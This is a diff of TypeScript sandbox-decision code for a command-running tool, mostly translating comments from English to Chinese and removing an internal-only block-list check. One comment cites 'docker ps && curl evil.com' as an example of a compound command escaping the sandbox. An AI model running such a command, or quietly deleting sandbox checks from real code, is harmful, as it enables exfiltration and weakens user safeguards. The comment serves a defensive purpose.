@@ -15,41 +15,12 @@ type SandboxInput = {
   dangerouslyDisableSandbox?: boolean
 }
 
-// NOTE: excludedCommands is a user-facing convenience feature, not a security boundary.
-// It is not a security bug to be able to bypass excludedCommands — the sandbox permission
-// system (which prompts users) is the actual security control.
+// 注意：excludedCommands 是对用户友好的便捷功能，并非安全边界。
+// 能够绕过 excludedCommands 并非安全缺陷——沙箱权限系统（会提示用户）才是真正的安全控制。
 function containsExcludedCommand(command: string): boolean {
-  // Check dynamic config for disabled commands and substrings (only for ants)
-  if (process.env.USER_TYPE === 'ant') {
-    const disabledCommands = getFeatureValue_CACHED_MAY_BE_STALE<{
-      commands: string[]
-      substrings: string[]
-    }>('内部代号_sandbox_disabled_commands', { commands: [], substrings: [] })
+  // 从动态配置检查被禁用的命令与子串（仅针对 ant）
 
-    // Check if command contains any disabled substrings
-    for (const substring of disabledCommands.substrings) {
-      if (command.includes(substring)) {
-        return true
-      }
-    }
-
-    // Check if command starts with any disabled commands
-    try {
-      const commandParts = splitCommand_DEPRECATED(command)
-      for (const part of commandParts) {
-        const baseCommand = part.trim().split(' ')[0]
-        if (baseCommand && disabledCommands.commands.includes(baseCommand)) {
-          return true
-        }
-      }
-    } catch {
-      // If we can't parse the command (e.g., malformed bash syntax),
-      // treat it as not excluded to allow other validation checks to handle it
-      // This prevents crashes when rendering tool use messages
-    }
-  }
-
-  // Check user-configured excluded commands from settings
+  // 从设置中检查用户配置的被排除命令
   const settings = getSettings_DEPRECATED()
   const userExcludedCommands = settings.sandbox?.excludedCommands ?? []
 
@@ -57,10 +28,9 @@ function containsExcludedCommand(command: string): boolean {
     return false
   }
 
-  // Split compound commands (e.g. "docker ps && curl evil.com") into individual
-  // subcommands and check each one against excluded patterns. This prevents a
-  // compound command from escaping the sandbox just because its first subcommand
-  // matches an excluded pattern.
+  // 将复合命令（如 "docker ps && curl evil.com"）拆分为单独的子命令，
+  // 并逐一与排除模式比对。这防止复合命令只因第一个子命令匹配某个
+  // 排除模式就从沙箱逃逸。
   let subcommands: string[]
   try {
     subcommands = splitCommand_DEPRECATED(command)
@@ -70,15 +40,15 @@ function containsExcludedCommand(command: string): boolean {
 
   for (const subcommand of subcommands) {
     const trimmed = subcommand.trim()
-    // Also try matching with env var prefixes and wrapper commands stripped, so
-    // that `FOO=bar bazel ...` and `timeout 30 bazel ...` match `bazel:*`. Not a
-    // security boundary (see NOTE at top); the &&-split above already lets
-    // `export FOO=bar && bazel ...` match. BINARY_HIJACK_VARS kept as a heuristic.
+    // 同时尝试去除环境变量前缀和包装命令后再匹配，这样
+    // `FOO=bar bazel ...` 与 `timeout 30 bazel ...` 都能匹配 `bazel:*`。这并非
+    // 安全边界（见文首注释）；上面的 && 拆分已能让
+    // `export FOO=bar && bazel ...` 匹配。BINARY_HIJACK_VARS 仅作为启发式规则保留。
     //
-    // We iteratively apply both stripping operations until no new candidates are
-    // produced (fixed-point), matching the approach in filterRulesByContentsMatchingInput.
-    // This handles interleaved patterns like `timeout 300 FOO=bar bazel run`
-    // where single-pass composition would fail.
+    // 我们迭代地应用两种剥离操作，直到不再产生新的候选项（不动点），
+    // 与 filterRulesByContentsMatchingInput 中的做法一致。
+    // 这能处理像 `timeout 300 FOO=bar bazel run` 这样交错出现的模式，
+    // 单次组合剥离可能会失败。
     const candidates = [trimmed]
     const seen = new Set(candidates)
     let startIdx = 0
@@ -132,7 +102,7 @@ export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
     return false
   }
 
-  // Don't sandbox if explicitly overridden AND unsandboxed commands are allowed by policy
+  // 仅当被明确覆盖、且策略允许非沙箱命令时，才不进入沙箱
   if (
     input.dangerouslyDisableSandbox &&
     SandboxManager.areUnsandboxedCommandsAllowed()
@@ -144,7 +114,7 @@ export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
     return false
   }
 
-  // Don't sandbox if the command contains user-configured excluded commands
+  // 命令包含用户配置的排除命令时，不进入沙箱
   if (containsExcludedCommand(input.command)) {
     return false
   }
